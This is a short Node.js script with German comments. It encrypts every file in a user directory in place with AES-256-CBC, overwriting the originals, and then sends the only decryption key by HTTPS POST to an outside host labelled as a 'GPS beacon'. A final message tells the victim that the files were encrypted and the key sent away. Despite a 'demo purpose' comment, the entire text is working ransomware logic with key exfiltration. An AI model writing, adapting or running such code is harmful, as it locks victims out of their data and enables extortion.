var fs = require('fs');
var crypto = require('crypto');
var https = require('https');

// Verzeichnis für die zu verschlüsselnden Dateien
var encryptDirectory = '/user/files';

// Generiere einen 256-Bit-Verschlüsselungsschlüssel
var encryptionKey = crypto.randomBytes(32);

// Funktion, um Dateien zu verschlüsseln
fs.readdirSync(encryptDirectory).forEach(file => {
  // Dateipfad erstellen
  var filePath = `${encryptDirectory}/${file}`;

  // Verzeichnisse überspringen
  if (fs.lstatSync(filePath).isDirectory()) return;

  // Dateiinhalt lesen
  var data = fs.readFileSync(filePath);

  // Initialisierungsvektor (IV) generieren
  var iv = crypto.randomBytes(16);

  // Verschlüsselung mit AES-256-CBC und IV
  var cipher = crypto.createCipheriv('aes-256-cbc', encryptionKey, iv);
  var encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);

  // Schreibe verschlüsselte Daten + IV in die Datei zurück
  var encryptedContent = Buffer.concat([iv, encryptedData]);
  fs.writeFileSync(filePath, encryptedContent);

  console.log(`Datei ${file} erfolgreich verschlüsselt.`);
});

// Sende Beacon mit Verschlüsselungsschlüssel (Demozweck)
var beaconData = JSON.stringify({ key: encryptionKey.toString('hex') });
var options = {
  hostname: 'send-to-gps.server.tld',
  port: 443,
  path: '/beacon',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': beaconData.length
  }
};

var req = https.request(options, res => {
  console.log(`GPS Beacon gesendet, Statuscode: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`Fehler beim Senden des GPS Beacons: ${error}`);
});

req.write(beaconData);
req.end();

// Hinweis für Benutzer zur Verschlüsselung
var encryptionNote = `
Die Dateien wurden verschlüsselt!  
Der Schlüssel wurde per Beacon an den GPS-Server gesendet. 
`;

console.log(encryptionNote);
